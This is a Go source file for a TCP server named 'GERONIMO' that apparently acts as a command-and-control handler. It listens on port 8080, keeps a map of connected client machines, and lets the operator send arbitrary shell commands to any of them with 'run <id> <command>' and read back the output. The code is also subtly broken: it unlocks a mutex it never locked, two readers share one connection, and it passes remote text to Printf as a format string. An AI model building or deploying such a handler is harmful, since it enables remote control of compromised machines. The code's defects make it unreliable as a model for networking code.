// server.go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	FIONREAD = 0x541B
)

var (
	clientMap = make(map[string]net.Conn)
	mu        sync.Mutex
)

func main() {
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()

	fmt.Println("GERONIMO\n---------\nThe server has started and is listening on port 8080\n!! Sometimes it may look like you cant type anything, just press enter and type again !!\n")

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				fmt.Println("Error accepting connection:", err)
				continue
			}
			go handleClient(conn)
		}
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		if input == "" {
			continue
		} else if input == "clear" {
			fmt.Print("\033[H\033[2J")
		} else if input == "list" {
			for id := range clientMap {
				_, ok := clientMap[id]
				if !ok {
					delete(clientMap, id)
					continue
				}
				fmt.Println("Client ID:", id)
			}
			mu.Unlock()
		} else if strings.HasPrefix(input, "run") {
			if len(input) < 4 {
				fmt.Println("Usage: run <client_id> <command>")
				continue
			}
			parts := strings.SplitN(input, " ", 3)
			if len(parts) < 3 {
				fmt.Println("Usage: run <client_id> <command>")
				continue
			}
			clientID := parts[1]
			command := parts[2]

			mu.Lock()
			conn, ok := clientMap[clientID]
			mu.Unlock()

			if !ok {
				fmt.Println("Client ID not found")
				continue
			}

			fmt.Fprintf(conn, command+"\n")
			go handleCommandResponse(conn)
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	id := generateClientID()
	fmt.Println("New client connected with ID:", id, "\n>>")

	mu.Lock()
	clientMap[id] = conn
	mu.Unlock()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		output := scanner.Text()
		fmt.Printf(output)
	}

	mu.Lock()
	delete(clientMap, id)
	mu.Unlock()
	fmt.Println("\nClient disconnected:", id, "\n>>")
}

func handleCommandResponse(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		output := scanner.Text()
		fmt.Println(output)
	}
}

func generateClientID() string {
	return fmt.Sprintf("%08d", time.Now().UnixNano()%100000000)
}
